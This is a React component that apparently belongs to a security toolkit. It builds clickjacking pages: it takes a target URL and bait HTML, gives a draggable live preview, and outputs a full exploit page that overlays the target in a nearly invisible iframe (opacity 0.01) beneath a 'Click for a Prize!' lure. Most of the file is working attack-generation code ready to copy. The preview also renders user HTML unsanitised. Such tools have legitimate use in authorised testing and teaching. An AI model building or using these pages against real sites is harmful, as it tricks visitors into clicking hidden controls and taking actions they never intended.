
'use client';

import { useState, useRef } from 'react';
import { z } from 'zod';
import { useForm } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
import { Form, FormControl, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { useToast } from '@/hooks/use-toast';
import { Clipboard, Code, MousePointer2 } from 'lucide-react';
import { Label } from '@/components/ui/label';
import { Textarea } from '@/components/ui/textarea';
import { Slider } from '@/components/ui/slider';

const formSchema = z.object({
  targetUrl: z.string().url({ message: 'Please enter a valid target URL.' }),
  baitHtml: z.string().min(1, 'Bait HTML cannot be empty.'),
});

const generateExploitHtml = (targetUrl: string, baitHtml: string, baitPosition: { top: number, left: number }) => `
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            overflow: hidden;
            position: relative;
        }
        #victim-iframe {
            width: 100vw;
            height: 100vh;
            border: none;
            opacity: 0.01; /* Low opacity to be invisible to the user but clickable */
            filter: alpha(opacity=1); /* IE8 and lower */
        }
        #bait-element {
            position: absolute;
            top: ${baitPosition.top}px;
            left: ${baitPosition.left}px;
            z-index: 2;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="bait-element">
        ${baitHtml}
    </div>
    <iframe id="victim-iframe" src="${targetUrl}"></iframe>
</body>
</html>
`;

export function ClickjackingTool() {
  const [generatedCode, setGeneratedCode] = useState<string | null>(null);
  const [iframeOpacity, setIframeOpacity] = useState(0.5);
  const [baitPosition, setBaitPosition] = useState({ top: 100, left: 100 });
  const [isDragging, setIsDragging] = useState(false);
  const dragOffset = useRef({ x: 0, y: 0 });

  const { toast } = useToast();

  const form = useForm<z.infer<typeof formSchema>>({
    resolver: zodResolver(formSchema),
    defaultValues: {
      targetUrl: 'https://example.com',
      baitHtml: '<button style="font-size: 20px; padding: 10px 20px; border-radius: 8px; border: 1px solid #ccc; background: #f0f0f0;">Click for a Prize!</button>',
    },
  });

  function onSubmit(values: z.infer<typeof formSchema>) {
    const code = generateExploitHtml(values.targetUrl, values.baitHtml, baitPosition);
    setGeneratedCode(code.trim());
    toast({ title: 'Exploit Code Generated', description: 'Copy the code from the output text area.' });
  }

  const handleCopy = () => {
    if (generatedCode) {
      navigator.clipboard.writeText(generatedCode);
      toast({ title: 'Copied!', description: 'HTML code copied to clipboard.' });
    }
  };

  const handleMouseDown = (e: React.MouseEvent<HTMLDivElement>) => {
    setIsDragging(true);
    dragOffset.current = {
      x: e.clientX - baitPosition.left,
      y: e.clientY - baitPosition.top,
    };
  };

  const handleMouseMove = (e: React.MouseEvent<HTMLDivElement>) => {
    if (isDragging) {
      setBaitPosition({
        left: e.clientX - dragOffset.current.x,
        top: e.clientY - dragOffset.current.y,
      });
    }
  };

  const handleMouseUp = () => {
    setIsDragging(false);
  };

  return (
    <Card>
      <CardHeader>
        <div className="flex items-center gap-3">
          <MousePointer2 className="h-6 w-6" />
          <CardTitle>Clickjacking Page Builder</CardTitle>
        </div>
        <CardDescription>
          Build a proof-of-concept clickjacking page by overlaying a target site.
        </CardDescription>
      </CardHeader>
      <CardContent>
        <Form {...form}>
          <form onSubmit={form.handleSubmit(onSubmit)} className="grid md:grid-cols-2 gap-8">
            <div className="space-y-4">
              <FormField control={form.control} name="targetUrl" render={({ field }) => (<FormItem><FormLabel>Target URL</FormLabel><FormControl><Input placeholder="https://vulnerable-site.com/settings" {...field} /></FormControl><FormMessage /></FormItem>)} />
              <FormField control={form.control} name="baitHtml" render={({ field }) => (<FormItem><FormLabel>Bait Element HTML</FormLabel><FormControl><Textarea placeholder='<button>Click Me</button>' {...field} className="font-mono h-24" /></FormControl><FormMessage /></FormItem>)} />
              <div className="space-y-2">
                <Label>Iframe Opacity (for alignment)</Label>
                <Slider defaultValue={[0.5]} max={1} step={0.05} onValueChange={(value) => setIframeOpacity(value[0])} />
              </div>
              <Button type="submit" className="w-full">
                <Code className="mr-2 h-4 w-4" />
                Generate Exploit HTML
              </Button>
            </div>
            <div className="space-y-2">
              <Label>Live Preview</Label>
              <div 
                className="relative border rounded-md w-full h-96 overflow-hidden bg-primary/20"
                onMouseMove={handleMouseMove}
                onMouseUp={handleMouseUp}
                onMouseLeave={handleMouseUp} // Stop dragging if mouse leaves the area
              >
                <div
                  style={{ top: baitPosition.top, left: baitPosition.left }}
                  className="absolute z-10 cursor-move"
                  onMouseDown={handleMouseDown}
                  dangerouslySetInnerHTML={{ __html: form.watch('baitHtml') }}
                />
                <iframe
                  src={form.watch('targetUrl')}
                  className="w-full h-full border-none"
                  style={{ opacity: iframeOpacity }}
                  title="Target Preview"
                  sandbox="" // Prevents scripts on the iframe from running and interfering
                />
                <p className="absolute bottom-2 right-2 text-xs text-muted-foreground bg-card/80 px-2 py-1 rounded">
                    Position: top: {baitPosition.top}px, left: {baitPosition.left}px
                </p>
              </div>
            </div>
          </form>
        </Form>
      </CardContent>
      {generatedCode && (
        <CardFooter className="flex-col items-start gap-4 border-t pt-6">
            <div className="w-full space-y-2">
                <div className="flex justify-between items-center">
                    <Label>Generated HTML</Label>
                    <Button variant="outline" size="sm" onClick={handleCopy}><Clipboard className="mr-2 h-4 w-4" /> Copy Code</Button>
                </div>
                <Textarea readOnly value={generatedCode} className="font-mono h-48 bg-primary/20" />
            </div>
        </CardFooter>
      )}
    </Card>
  );
}
